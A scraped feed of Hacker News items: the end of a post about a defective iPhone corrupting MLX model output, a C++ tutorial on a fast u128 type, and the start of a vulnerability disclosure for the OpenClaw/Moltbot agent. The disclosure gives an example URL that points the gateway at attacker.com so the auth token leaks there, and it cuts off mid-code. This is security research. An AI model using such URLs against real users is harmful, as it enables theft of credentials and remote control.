get it to work, I'm ready to give up...<br>...until, on a Tuesday morning, at 7-8 AM, I have an idea: let me, just in case, run this on my old iPhone 15 Pro. Up to this point, I was running it on my daily driver, an iPhone 16 Pro Max that was a replacement phone sent by Apple Care after a small clubbing mishap (in which my iPhone was irreparably crashed). I rush to get everything ready before it's time to go to work and: it works! Gemma, Qwen, and all other models generate coherent responses!</p></div><p>I stop and think: this cannot be a hardware issue,<em> right</em>? Of course not. The iPhone 15 is still running iOS 18. The iPhone 16 is running 26. It <strong><em>must be an OS issue</em></strong>. Well, time to be late for my work standup and update the old phone. The curiosity is too much. Many minutes later... same results, now on iOS 26. The plot is thickening.</p><h2 id="finding-the-smoking-gun-breakpoints-in-mlxs-implementations-of-gemma">Finding the smoking gun: breakpoints in MLX's implementations of Gemma</h2><p>After that work day, and after many lunch and coffee discussions with coworkers about the sources of my troubles, I get home and immediately set myself on debugging MLX as it runs, if possible. The game plan is:</p><ul><li>Use a known-to-be-reliable model, that fits in RAM (I went with quantized Gemma)</li><li>Use a simple prompt, in my case "What is 2+2?"<ul><li>To be <em>really</em> pedantic: the prompt was <code>&lt;start_of_turn&gt;user\nWhat is 2+2?&lt;end_of_turn&gt;\n&lt;start_of_turn&gt;model</code></li></ul></li><li>Run everything with temperature set to <code>0.0</code> – maybe that's enough to remove variability</li><li>Find the model implementation</li><li>Find where the model iterates through the layers and</li><li>Print out the MLXArray/Tensor with the values on each layer as the input goes through</li></ul><p>A few moments later and I find where I need to be. Added the breakpoints, added the logs and off to the races.</p><figure><img src="https://journal.rafaelcosta.me/content/images/2026/01/Screenshot-2026-01-27-at-18.28.38.png" alt="" loading="lazy" width="1892" height="1186" srcset="https://journal.rafaelcosta.me/content/images/size/w600/2026/01/Screenshot-2026-01-27-at-18.28.38.png 600w, https://journal.rafaelcosta.me/content/images/size/w1000/2026/01/Screenshot-2026-01-27-at-18.28.38.png 1000w, https://journal.rafaelcosta.me/content/images/size/w1600/2026/01/Screenshot-2026-01-27-at-18.28.38.png 1600w, https://journal.rafaelcosta.me/content/images/2026/01/Screenshot-2026-01-27-at-18.28.38.png 1892w" sizes="(min-width: 720px) 720px"><figcaption><span>These ones were the ones I added</span></figcaption></figure><p>I run it on my iPhone 16 Pro Max. The model loads and the prompt is "What is 2+2?". The tensors start printing out, line after line after line. For once, the logs aren't <em>complete</em> gibberish – they're numbers. Floating point values representing the model's internal state as it processes the input. I save the output to a file and do the same on my iPhone 15 Pro. Same model, same prompt, same code. Time to compare.</p><h2 id="welp-now-its-definitely-out-of-my-expertise">Welp, now it's definitely out of my expertise</h2><div><p>I grep for a pattern I know should be consistent – an array at log-line 58, right before the values get normalized/softmaxed. On a working device, I hypothesize this should be the same every time.</p><p>On the iPhone 15 Pro:<br><code>3: "[[[[53.875, 62.5625, -187.75, ..., 42.625, 6.25, -21.5625]]]]"</code><br>On the iPhone 16 Pro Max:<br><code>3: "[[[[191.5, 23.625, 173.75, ..., 1298, -147.25, -162.5]]]]"</code></p><p>Huh. Not close. Not at all. These values are orders of magnitude off. I double check the start of the logs and both phones show the same:<br><code>1: "array([[[0.162842, -0.162842, -0.48877, ..., -0.176636, 0.0001297, 0.088501],\n [-0.348633, -2.78906, 0, ..., 0.84668, 0, -1.69336],\n [-1.30957, 1.57324, -1.30957, ..., -0.0010376, -0.0010376, 1.12305],\n ...,\n [-0.348633, -2.78906, 0, ..., 0.84668, 0, -1.69336],\n [0.296875, 0.59375, 0.890625, ..., -0.59375, 0.296875, -0.890137],\n [1.02734, -0.616211, -0.616211, ..., -0.275879, -0.551758, 0.275879]]], dtype=float16)"</code></p></div><p>OK, so the model receives the same thing as input, but at some point, the values start to go off. Like, <strong><em>way off</em></strong>. In order to make sure I'm not crazy, I do one last thing: run the same thing on my Mac. Make the app run on iPad compatibility mode and...<br><code>3: "[[[[53.875, 62.5625, -187.75, ..., 42.625, 6.25, -21.5625]]]]"</code></p><p><strong>Bingo! Same as iPhone 15!</strong></p><p>The model isn't broken. The code isn't broken. Most importantly, I'm not broken*. My <strong>phone</strong> is broken.<br>*arguable, but besides the point here</p><h2 id="whats-going-on">What's going on?</h2><p>Let me explain what I think it's going on here: the iPhone 16 Pro Max contains Apple's A18 chip with its Neural Engine—a specialized accelerator for machine learning operations. MLX uses Metal to compile tensor operations for this accelerator. Somewhere in that stack, the computations are going <strong>very</strong> wrong. I don't think it's a widespread issue but, I do get disappointed that a relatively newly replaced iPhone from Apple Care came with such an issue.</p><p>However, if my Apple Intelligence troubles are related – and they might as well be, I'd assume that code and MLX are not dissimilar in operations being done –, it could be that <a href="https://discussions.apple.com/thread/255822364?answerId=261482678022&amp;sortBy=rank&amp;page=12&amp;ref=journal.rafaelcosta.me#261482678022">all the 12 pages of users</a> are users in a similar dillema, but without the means of debugging it.</p><h2 id="what-now">What now?</h2><p>I spent 3 days thinking I was incompetent. I blamed MiniMax. I blamed myself. The entire time, my $1,400 phone had a broken hardware. I could lose more time figuring out <em>exactly</em> what is wrong with it but it’s literally not worth my time.</p><p>I guess I can at least take a lesson that, when debugging, I should always consider the physical layer. I spent three days assuming this was a software problem – my code, the library, the framework, my skills as a developer. The breakthrough was basically: "What if I'm not dumb and it's not my code?"</p><p>As for my phone: it'll probably go back to Apple, as a trade in for a new iPhone 17 Pro Max that <em>hopefully 🤞</em> can do math.</p><h3 id="update-on-feb-1st">Update on Feb. 1st:</h3><p>Well, now it's Feb. 1st and I have an iPhone 17 Pro Max to test with and... everything works as expected. So it's pretty safe to say that <strong>THAT</strong> specific instance of iPhone 16 Pro Max was hardware-defective.<br></p>
			</section>
	</article>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Building Your Own Efficient uint128 in C++ (106 pts)]]></title>
            <link>https://solidean.com/blog/2026/building-your-own-u128/</link>
            <guid>46849154</guid>
            <pubDate>Sun, 01 Feb 2026 20:40:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://solidean.com/blog/2026/building-your-own-u128/">https://solidean.com/blog/2026/building-your-own-u128/</a>, See on <a href="https://news.ycombinator.com/item?id=46849154">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <article>
            

            <div>
                <div>
    <p><strong>TL;DR:</strong></p><div>
        <p>We build a minimal <code>u128</code> as two <code>u64</code> limbs and implement arithmetic using carry, borrow, and multiply intrinsics that map directly to x64 instructions.
The generated code is on par with builtin <code>__uint128_t</code> for addition, subtraction, multiplication, and comparison.
This is unsigned-only, x64-focused, and intentionally narrow in scope.
The result is a solid foundation for exact, fixed-width arithmetic with a focus on good codegen and predictability, not abstraction.</p>
<p>Full code and compiler output: <a href="https://godbolt.org/z/K6dn3s91Y">https://godbolt.org/z/K6dn3s91Y</a></p>

    </div>
</div><h2 id="scope">Scope</h2>
<p>We take the smallest reasonable definition of a 128-bit integer, two 64-bit words, and turn it into a usable arithmetic type whose generated code is indistinguishable from a builtin <code>__uint128_t</code>.</p>
<p>This post is explicitly not about dynamically-sized big integer arithmetic.
It is about being explicit with range bounds and letting the compiler emit the exact instructions we want.
The scope is deliberately limited: unsigned arithmetic, fixed width, modern x64, with Clang and GCC as the primary targets and notes for MSVC where it differs.</p>
<h2 id="why-fixed-width-big-integers">Why fixed-width big integers</h2>
<p>In many domains, especially geometry and numerics, we do not need arbitrary precision.
We need enough precision to be exact for known bounds, and we need the cost to be predictable.</p>
<p>Dynamic big integer libraries solve a different problem.
They are flexible and general, but they pay for that generality in memory traffic, branches, and indirection.
If your values fit into a fixed number of bits and you know that ahead of time, fixed-width arithmetic is usually the better trade.
(In fact, our high-performance exact mesh booleans are completely built on this: <a href="https://solidean.com/docs/concepts/exact-arithmetic/">Exact Arithmetic in Solidean</a>)</p>
<p>A 128-bit integer is the gateway drug to fixed-width arithmetic.
It is the smallest width that is no longer builtin, while still mapping cleanly to the underlying hardware.
Once the carry and multiply patterns are explicit at 128 bits, extending them to 192 or 256 bits is straightforward.
In production, we use 256-bit integers in our hot paths and go up to 564 bits for certain edge cases.</p>
<h2 id="representation">Representation</h2>
<p>We represent a 128-bit unsigned integer as two 64-bit limbs.
You can literally think of this as writing the <code>u128</code> as a 2-digit number in base \(2^{64}\).
Because it's unsigned, we don't need to think about two's complement.</p>
<pre data-lang="cpp"><code data-lang="cpp"><span>#include </span><span>&lt;cstdint&gt;
</span><span>#include </span><span>&lt;immintrin.h&gt; </span><span>// _addcarry_u64, _subborrow_u64, _mulx_u64
</span><span>
</span><span>// this is the type used in the intrinsics signature
</span><span>// (and uint64_t is unsigned long, not unsigned long long...)
</span><span>using </span><span>u64 </span><span>= </span><span>unsigned long long</span><span>;
</span><span>
</span><span>struct </span><span>u128
</span><span>{
</span><span>    u64 low </span><span>= </span><span>0</span><span>;
</span><span>    u64 high </span><span>= </span><span>0</span><span>;
</span><span>}</span><span>;
</span></code></pre>
<h2 id="addition-with-carry">Addition, with carry</h2>
<p>We start off easy.
Addition is simply done using long addition on our base \(2^{64}\) digits.
The intrinsic <code>_addcarry_u64</code> corresponds to the x64 instruction <code>adc</code> and is exactly what we need:
Given two <code>u64</code> summands and an input carry (0 or 1), we get the <code>u64</code> result (via a slightly cumbersome output parameter) and a new carry.</p>
<pre data-lang="cpp"><code data-lang="cpp"><span>u128 </span><span>operator+</span><span>(u128 </span><span>a,</span><span> u128 </span><span>b</span><span>) 
</span><span>{
</span><span>    u128 r</span><span>;
</span><span>    </span><span>unsigned char</span><span> c </span><span>= </span><span>_addcarry_u64</span><span>(</span><span>0</span><span>,</span><span> a.low</span><span>,</span><span>  b.low</span><span>,  &amp;</span><span>r.low)</span><span>;
</span><span>    (</span><span>void</span><span>)</span><span>_addcarry_u64</span><span>(c</span><span>,</span><span> a.high</span><span>,</span><span> b.high</span><span>, &amp;</span><span>r.high)</span><span>;
</span><span>    </span><span>return</span><span> r</span><span>;
</span><span>}
</span></code></pre>
<p>The generated assembly is exactly what you would write by hand.</p>
<pre data-lang="asm"><code data-lang="asm"><span>operator</span><span>+</span><span>(u128</span><span>, </span><span>u128):
</span><span>        </span><span>mov     </span><span>rax</span><span>, </span><span>rdi
</span><span>        </span><span>add     </span><span>rax</span><span>, </span><span>rdx
</span><span>        </span><span>adc     </span><span>rsi</span><span>, </span><span>rcx
</span><span>        </span><span>mov     </span><span>rdx</span><span>, </span><span>rsi
</span><span>        </span><span>ret
</span></code></pre>
<p>The moves are just calling convention noise.
The core is an <code>add</code> (because the first addition has no input carry) followed by an <code>adc</code>.
This is identical to what the compiler emits for <code>__uint128_t</code> addition.</p>
<p>A small but important point is that intrinsics are preferable to inline assembly here.
They act like specialized IR operations.
The compiler understands their semantics, can schedule around them, and can still optimize aggressively.
Inline assembly is more of a black box and much easier to get wrong or inhibit optimizations.</p>
<h2 id="subtraction-same-story-inverted">Subtraction: same story, inverted</h2>
<p>Subtraction mirrors addition almost perfectly.
Instead of a carry, we track a borrow.
On x64, this is <code>sbb</code>, subtract with borrow.
The corresponding intrinsic is <code>_subborrow_u64</code>.</p>
<pre data-lang="cpp"><code data-lang="cpp"><span>u128 </span><span>operator-</span><span>(u128 </span><span>a,</span><span> u128 </span><span>b</span><span>) 
</span><span>{
</span><span>    u128 r</span><span>;
</span><span>    </span><span>unsigned char</span><span> c </span><span>= </span><span>_subborrow_u64</span><span>(</span><span>0</span><span>,</span><span> a.low</span><span>,</span><span>  b.low</span><span>,  &amp;</span><span>r.low)</span><span>;
</span><span>    (</span><span>void</span><span>)</span><span>_subborrow_u64</span><span>(c</span><span>,</span><span> a.high</span><span>,</span><span> b.high</span><span>, &amp;</span><span>r.high)</span><span>;
</span><span>    </span><span>return</span><span> r</span><span>;
</span><span>}
</span></code></pre>
<p>And again, the assembly is exactly what we want.</p>
<pre data-lang="asm"><code data-lang="asm"><span>operator</span><span>-</span><span>(u128</span><span>, </span><span>u128):
</span><span>        </span><span>mov     </span><span>rax</span><span>, </span><span>rdi
</span><span>        </span><span>sub     </span><span>rax</span><span>, </span><span>rdx
</span><span>        </span><span>sbb     </span><span>rsi</span><span>, </span><span>rcx
</span><span>        </span><span>mov     </span><span>rdx</span><span>, </span><span>rsi
</span><span>        </span><span>ret
</span></code></pre>
<p>At this point, addition and subtraction are basically solved.
There is no hidden cost and no abstraction penalty.
It's also easy to see how this scales to larger integer types with one extra instruction per <code>u64</code> "digit".</p>
<h2 id="multiplication-regrouping-our-u64-digits">Multiplication: regrouping our <code>u64</code> digits</h2>
<p>Multiplication is where things get more interesting.
A 128-bit by 128-bit multiply produces a 256-bit result but we want only the lower 128 bit for our result.
Same story with <code>u64 * u64</code> really, which produces a 128 bit result in theory, but you usually only use the lower <code>u64</code>.
Speaking of which, all modern 64-bit architectures give you access to fast <code>u64 * u64 -&gt; u128</code> instructions.
With BMI2, this is exposed as <code>_mulx_u64</code>.
On MSVC, the equivalent is <code>_umul128</code>.
This is our building block for large multiplication.</p>
<p>You can derive the code from writing the <code>u128 * u128</code> as 2-digit long multiplication <code>(u64, u64) * (u64, u64)</code> and then look sharply at what sums up to which digit.</p>
<p>That's how I do it on paper, but here we can also choose an algebraic route.
Write the numbers as:
$$
(a.\text{low} + 2^{64} \cdot a.\text{high}) \cdot (b.\text{low} + 2^{64} \cdot b.\text{high})
$$
Expanding this gives four terms. Of those, only three contribute to the low 128 bits:</p>
<ul>
<li>\(a_\text{low} \cdot b_\text{low}\) contributes both low and high parts</li>
<li>\(a_\text{low} \cdot b_\text{high}\) contributes to bits 64..127</li>
<li>\(a_\text{high} \cdot b_\text{low}\) contributes to bits 64..127</li>
<li>\(a_\text{high} \cdot b_\text{high}\) contributes only above bit 128 and can be discarded</li>
</ul>
<p>This works for larger integers as well, though summing up intermediate terms can produce carries for "higher digits".</p>
<pre data-lang="cpp"><code data-lang="cpp"><span>u128 </span><span>operator*</span><span>(u128 </span><span>a,</span><span> u128 </span><span>b</span><span>) 
</span><span>{
</span><span>    </span><span>// we want the low 128 bits of:
</span><span>    </span><span>// (a.low + 2^64 a.high) * (b.low + 2^64 b.high)
</span><span>    </span><span>//
</span><span>    </span><span>// r.low  = lo64(a.low * b.low)
</span><span>    </span><span>// r.high = hi64(a.low * b.low)
</span><span>    </span><span>//        + lo64(a.low * b.high)
</span><span>    </span><span>//        + lo64(a.high * b.low)        (mod 2^64)
</span><span>
</span><span>    </span><span>// NOTE (MSVC): for multiply, you can use _umul128(a, b, &amp;hi) instead of _mulx_u64.
</span><span>    </span><span>//              Clang/GCC: _mulx_u64 is BMI2 and needs -mbmi2.
</span><span>
</span><span>    u128 r</span><span>;
</span><span>
</span><span>    u64 p0_hi</span><span>;
</span><span>    r.low </span><span>= </span><span>_mulx_u64</span><span>(a.low</span><span>,</span><span> b.low</span><span>, &amp;</span><span>p0_hi)</span><span>;
</span><span>
</span><span>    </span><span>// cross terms: only the low 64 bits contribute to r.high
</span><span>    u64 t1_hi</span><span>;
</span><span>    u64 t1_lo </span><span>= </span><span>_mulx_u64</span><span>(a.low</span><span>,</span><span>  b.high</span><span>, &amp;</span><span>t1_hi)</span><span>;
</span><span>
</span><span>    u64 t2_hi</span><span>;
</span><span>    u64 t2_lo </span><span>= </span><span>_mulx_u64</span><span>(a.high</span><span>,</span><span> b.low</span><span>,  &amp;</span><span>t2_hi)</span><span>;
</span><span>
</span><span>    </span><span>// simply add is sufficient: carries would land in bit 128 and are discarded
</span><span>    r.high </span><span>=</span><span> p0_hi </span><span>+</span><span> t1_lo </span><span>+</span><span> t2_lo</span><span>;
</span><span>
</span><span>    </span><span>return</span><span> r</span><span>;
</span><span>}
</span></code></pre>
<p>Note that we do not need carry handling there.
Any carry out of bit 127 would land in bit 128, which we are discarding anyway.</p>
<p>The compiler output reflects this reasoning.</p>
<pre data-lang="asm"><code data-lang="asm"><span>operator</span><span>*</span><span>(u128</span><span>, </span><span>u128):
</span><span>        mulx    </span><span>r8</span><span>, </span><span>rax</span><span>, </span><span>rdi
</span><span>        </span><span>imul    </span><span>rcx</span><span>, </span><span>rdi
</span><span>        </span><span>imul    </span><span>rdx</span><span>, </span><span>rsi
</span><span>        </span><span>add     </span><span>rdx</span><span>, </span><span>rcx
</span><span>        </span><span>add     </span><span>rdx</span><span>, </span><span>r8
</span><span>        </span><span>ret
</span></code></pre>
<p>The compiler chooses slightly different instructions and registers for the builtin <code>__uint128_t</code> multiplication but is otherwise identical as well.</p>
<h2 id="equality">Equality</h2>
<p>Now an easy one.
<code>u128</code> equality is simple structural equality.</p>
<pre data-lang="cpp"><code data-lang="cpp"><span>bool </span><span>operator==</span><span>(u128 </span><span>a,</span><span> u128 </span><span>b</span><span>) 
</span><span>{
</span><span>    </span><span>return</span><span> a.low </span><span>==</span><span> b.low </span><span>&amp;&amp;</span><span> a.high </span><span>==</span><span> b.high</span><span>;
</span><span>}
</span></code></pre>
<p>The generated assembly is worth a quick look.</p>
<pre data-lang="asm"><code data-lang="asm"><span>operator==(u128</span><span>, </span><span>u128):
</span><span>        </span><span>xor     </span><span>rdi</span><span>, </span><span>rdx
</span><span>        </span><span>xor     </span><span>rsi</span><span>, </span><span>rcx
</span><span>        </span><span>or      </span><span>rsi</span><span>, </span><span>rdi
</span><span>        </span><span>sete    </span><span>al
</span><span>        </span><span>ret
</span></code></pre>
<p>Instead of branching (as you might expect from the short-circuiting of <code>&amp;&amp;</code>), the compiler XORs the corresponding limbs.
XOR produces zero if and only if the inputs are equal.
ORing the results combines the checks.
If the final value is zero, both limbs were equal.</p>
<p>This pattern continues for larger integers, though we might see branching due to short-circuiting at some point.
(We could of course just use the XOR approach in <code>operator==</code> but it is distinctly less readable.)</p>
<h2 id="comparison-borrow-beats-branching">Comparison: borrow beats branching</h2>
<p>The straightforward way to compare two 128-bit integers is to compare the high parts first and then the low parts.</p>
<pre data-lang="cpp"><code data-lang="cpp"><span>bool </span><span>operator&lt;</span><span>(u128 </span><span>a,</span><span> u128 </span><span>b</span><span>)
</span><span>{
</span><span>    </span><span>if </span><span>(a.high </span><span>!=</span><span> b.high) </span><span>return</span><span> a.high </span><span>&lt;</span><span> b.high</span><span>;
</span><span>    </span><span>return</span><span> a.low </span><span>&lt;</span><span> b.low</span><span>;
</span><span>}
</span></code></pre>
<p>This is correct, but the codegen is not great:</p>
<pre data-lang="asm"><code data-lang="asm"><span>operator&lt;(u128</span><span>, </span><span>u128):
</span><span>        </span><span>xor     </span><span>r8d</span><span>, </span><span>r8d
</span><span>        </span><span>cmp     </span><span>rdi</span><span>, </span><span>rdx
</span><span>        </span><span>setb    </span><span>r8b
</span><span>        </span><span>xor     </span><span>eax</span><span>, </span><span>eax
</span><span>        </span><span>cmp     </span><span>rsi</span><span>, </span><span>rcx
</span><span>        </span><span>setb    </span><span>al
</span><span>        </span><span>cmove   </span><span>eax</span><span>, </span><span>r8d
</span><span>        </span><span>ret
</span></code></pre>
<p>Works, but heavier than necessary.
We can do better by leaning on the hardware borrow flag.</p>
<p>Unsigned comparison <code>a &lt; b</code> is equivalent to checking whether <code>a - b</code> produces a borrow:</p>
<pre data-lang="cpp"><code data-lang="cpp"><span>bool </span><span>operator&lt;</span><span>(u128 </span><span>a,</span><span> u128 </span><span>b</span><span>) 
</span><span>{
</span><span>    u64 dont_care</span><span>;
</span><span>
</span><span>    </span><span>// compute borrow from (a.low - b.low). If a.low &lt; b.low =&gt; borrow = 1.
</span><span>    </span><span>unsigned char</span><span> borrow </span><span>= </span><span>_subborrow_u64</span><span>(</span><span>0</span><span>,</span><span> a.low</span><span>,</span><span> b.low</span><span>, &amp;</span><span>dont_care)</span><span>;
</span><span>
</span><span>    </span><span>// now subtract highs with that borrow
</span><span>    </span><span>// final borrow tells us if a &lt; b in 128-bit unsigned.
</span><span>    borrow </span><span>= </span><span>_subborrow_u64</span><span>(borrow</span><span>,</span><span> a.high</span><span>,</span><span> b.high</span><span>, &amp;</span><span>dont_care)</span><span>;
</span><span>
</span><span>    </span><span>return</span><span> borrow </span><span>!= </span><span>0</span><span>;
</span><span>}
</span></code></pre>
<p>The resulting assembly is minimal:</p>
<pre data-lang="asm"><code data-lang="asm"><span>operator&lt;(u128</span><span>, </span><span>u128):
</span><span>        </span><span>cmp     </span><span>rdi</span><span>, </span><span>rdx
</span><span>        </span><span>sbb     </span><span>rsi</span><span>, </span><span>rcx
</span><span>        </span><span>setb    </span><span>al
</span><span>        </span><span>ret
</span></code></pre>
<p>One compare, one subtract with borrow, and a flag check.
This is exactly the kind of codegen we want in hot code.</p>
<h2 id="a-small-use-site">A small use site</h2>
<p>To make sure everything composes properly, let's build a slightly larger function.</p>
<pre data-lang="cpp"><code data-lang="cpp"><span>u128 </span><span>demo_u128</span><span>(u128 </span><span>a,</span><span> u128 </span><span>b</span><span>) 
</span><span>{
</span><span>    u128 x </span><span>=</span><span> a </span><span>+</span><span> b</span><span>;
</span><span>    u128 y </span><span>=</span><span> a </span><span>*</span><span> b</span><span>;
</span><span>    </span><span>return</span><span> x </span><span>&lt;</span><span> y
</span><span>            </span><span>?</span><span> y </span><span>-</span><span> x
</span><span>            </span><span>:</span><span> x </span><span>-</span><span> y</span><span>;
</span><span>}
</span></code></pre>
<p>All operators inline cleanly:</p>
<pre data-lang="asm"><code data-lang="asm"><span>demo_u128(u128</span><span>, </span><span>u128):
</span><span>        </span><span>mov     </span><span>r8</span><span>, </span><span>rdi
</span><span>        </span><span>add     </span><span>r8</span><span>, </span><span>rdx
</span><span>        </span><span>mov     </span><span>r9</span><span>, </span><span>rsi
</span><span>        </span><span>adc     </span><span>r9</span><span>, </span><span>rcx
</span><span>        mulx    </span><span>rax</span><span>, </span><span>r10</span><span>, </span><span>rdi
</span><span>        </span><span>imul    </span><span>rcx</span><span>, </span><span>rdi
</span><span>        </span><span>imul    </span><span>rdx</span><span>, </span><span>rsi
</span><span>        </span><span>add     </span><span>rdx</span><span>, </span><span>rcx
</span><span>        </span><span>add     </span><span>rdx</span><span>, </span><span>rax
</span><span>        </span><span>mov     </span><span>rax</span><span>, </span><span>r8
</span><span>        </span><span>sub     </span><span>rax</span><span>, </span><span>r10
</span><span>        </span><span>mov     </span><span>rcx</span><span>, </span><span>r9
</span><span>        </span><span>sbb     </span><span>rcx</span><span>, </span><span>rdx
</span><span>        </span><span>jae     </span><span>.LBB13_2
</span><span>        </span><span>sub     </span><span>r10</span><span>, </span><span>r8
</span><span>        </span><span>sbb     </span><span>rdx</span><span>, </span><span>r9
</span><span>        </span><span>mov     </span><span>rax</span><span>, </span><span>r10
</span><span>        </span><span>mov     </span><span>rcx</span><span>, </span><span>rdx
</span><span>.LBB13_2:
</span><span>        </span><span>mov     </span><span>rdx</span><span>, </span><span>rcx
</span><span>        </span><span>ret
</span></code></pre>
<p>There is a branch for the ternary operator while the builtin version uses conditional moves instead.
Which is better depends on data patterns but could go either way.
I consider this basically as good as it gets.</p>
<h2 id="platform-notes">Platform notes</h2>
<p>The examples shown are for x64 with Clang or GCC.</p>
<p>On MSVC, <code>_addcarry_u64</code> and <code>_subborrow_u64</code> work the same way.
For multiplication, <code>_umul128</code> replaces <code>_mulx_u64</code>.</p>
<p>On AArch64, the same approach applies using <code>adds</code> and <code>adcs</code> instructions for addition, <code>subs</code> and <code>sbcs</code> for subtraction, and <code>mul + umulh</code> for the low + high half of a 64-bit multiply.
The patterns carry over directly, even though the intrinsics differ slightly (and multiplication is split into two parts).</p>
<h2 id="outlook">Outlook</h2>
<p>This <code>u128</code> is the easiest large integer you can write.
Our goal is best performance, so we made sure that codegen is reasonably identical to the builtin <code>__uint128_t</code>.</p>
<p>From here, the same patterns extend naturally to signed variants, widening multiplies such as u128 times u128 to u256, and chains of fixed-width integers like i192 or i256.
More importantly, the same reasoning applies when you design predicate-specific arithmetic that only computes what is actually needed.</p>
<p>A lot of our performance really boils down to these types:
No <code>BigInteger</code> tax, no floating predicates (that need a few kB of stack space for the worst case).
Just a lot of straightline integer code and some light static branching.</p>
<h2 id="addendum-2026-01-24">Addendum 2026-01-24</h2>
<p>Some notes based on reader feedback.</p>
<p><strong>On PowerPC:</strong>
I don't know much about PowerPC or the availability of intrinsics, but the instructions you need are definitely there.
For add/sub with carry, there's <a href="https://www.ibm.com/docs/en/aix/7.2.0?topic=set-addc-add-carrying-instruction">addc</a> / <a href="https://www.ibm.com/docs/en/aix/7.2.0?topic=set-adde-ae-add-extended-instruction">adde</a> for addition and <a href="https://www.ibm.com/docs/en/aix/7.2.0?topic=set-subfc-sf-subtract-from-carrying-instruction">subfc</a> / <a href="https://www.ibm.com/docs/en/aix/7.2.0?topic=set-subfe-sfe-subtract-from-extended-instruction">subfe</a> for subtraction with borrow.
For wide multiplication, <a href="https://www.ibm.com/docs/en/aix/7.2.0?topic=set-mulhdu-multiply-high-double-word-unsigned-instruction">mulhdu</a> gives you the high half of a 64-bit multiply (and <a href="https://www.ibm.com/docs/en/aix/7.2.0?topic=set-mulhd-multiply-high-double-word-instruction">mulhd</a> for signed).</p>
<p><strong>On GCC codegen with intrinsics:</strong>
Someone pointed out that GCC doesn't always handle the intrinsic-based addition optimally.
It sometimes <a href="https://godbolt.org/z/f6aqMcfcW">moves the result through the stack</a> before setting it in the final registers.
This is related to writing directly to the result struct.
If you write to "real" scalars first, the <a href="https://godbolt.org/z/bo9x4951v">codegen is optimal again</a>.
A weird one.</p>
<p><strong>On division:</strong>
There is no neat codegen for division.
Even the builtin <a href="https://godbolt.org/z/rrMo5deqz">delegates to a library call</a>.
The naive but practical approach is binary long division, which finishes in up to 128 steps.
Either branchless with fixed runtime or with a loop that searches for the next set bit.
Either way it's a bit of work.
Our exact predicates are always formulated in a division-free way simply because division would be expensive.</p>
<p><strong>On <code>_BitInt(N)</code>:</strong>
The upcoming <code>_BitInt(N)</code> type does work, but with caveats.
For B = 128, you get the normal codegen.
For <a href="https://godbolt.org/z/j9fd5EW3n">B &gt; 128</a>, GCC calls into a function where the bit size is a runtime parameter.
So yes, they would work, but performance will be subpar for larger widths.
Clang generates properly inlined assembly.</p>

            </div>

            
        </article>
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[1-Click RCE to steal your Moltbot data and keys (171 pts)]]></title>
            <link>https://depthfirst.com/post/1-click-rce-to-steal-your-moltbot-data-and-keys</link>
            <guid>46848769</guid>
            <pubDate>Sun, 01 Feb 2026 19:47:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://depthfirst.com/post/1-click-rce-to-steal-your-moltbot-data-and-keys">https://depthfirst.com/post/1-click-rce-to-steal-your-moltbot-data-and-keys</a>, See on <a href="https://news.ycombinator.com/item?id=46848769">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><h2>Hacking the Hottest Agent in Tech</h2><p>OpenClaw (formerly Moltbot and ClawdBot), the open-source AI personal assistant that can take actions on your behalf, is the most popular topic on X right now. It is already trusted by over 100,000 developers to hold the keys to their digital life, from iMessage/WhatsApp/Slack access to unrestricted local computer control. But when you grant an agent "god mode" permissions, the margin for error vanishes. While the community celebrated its capabilities, depthfirst General Security Intelligence silently audited its code and found a critical vulnerability. I investigated the finding, combined it with a vulnerability I discovered, and chained them into a 1-Click Remote Code Execution (RCE) exploit. With this exploit, a single visit to a malicious webpage was enough to hack your computer and AI assistant.</p><p>I’ll dissect the logic flaw depthfirst uncovered and walk you through the exact kill chain I built to weaponize it.</p><h2>How depthfirst Flagged the Vulnerability</h2><p>Codebases are rarely linear; logic is scattered, fragmented, and buried across dozens of files. That’s where the complexity and bugs hide.</p><p>Our system maps the full flow of an application's lifecycle. Here, our engine stitched together a data flow across the stack to reveal a critical logic gap: </p><p><strong>1. Ingestion:</strong> <code>app-settings.ts</code> blindly accepts a <code>gatewayUrl</code> query parameter in the URL and persists it to storage. For example, <code>https://localhost?gatewayUrl=attacker.com</code> would save <code>attacker.com</code> as the new gateway url.</p><pre contenteditable="false"><code><span>const</span><span> gatewayUrlRaw = params.get(</span><span>"gatewayUrl"</span><span>);
</span>...
<span></span><span>if</span><span> (gatewayUrlRaw != </span><span>null</span><span>) {
</span><span>  </span><span>const</span><span> gatewayUrl = gatewayUrlRaw.trim();
</span><span>  </span><span>if</span><span> (gatewayUrl &amp;&amp; gatewayUrl !== host.settings.gatewayUrl) {
</span><span>    applySettings(host, { ...host.settings, gatewayUrl }); </span><span>// persisted via saveSettings -&gt; localStorage</span><span>
</span>  }
<!-- -->}
</code></pre><p><strong>2. Processing:</strong> <code>app-lifecycle.ts</code> triggers <code>connectGateway()</code> <em>immediately</em> after settings (such as the gateway url) are applied.</p><pre contenteditable="false"><code><span>handleConnected</span><span>(</span><span>host</span><span>)</span><span> {
</span>  ...
<span>  connectGateway(host); </span><span>// runs immediately on load after parsing URL params</span><span>
</span>  startNodesPolling(host);
<!-- -->  ...
<!-- -->}</code></pre><p>3. <strong>Protocol Execution:</strong> gateway.ts automatically bundles the security-sensitive authToken into the system’s connection handshake to the new gateway.</p><pre contenteditable="false"><code><span>const</span><span> params = { ... , authToken, </span><span>locale</span><span>: navigator.language };
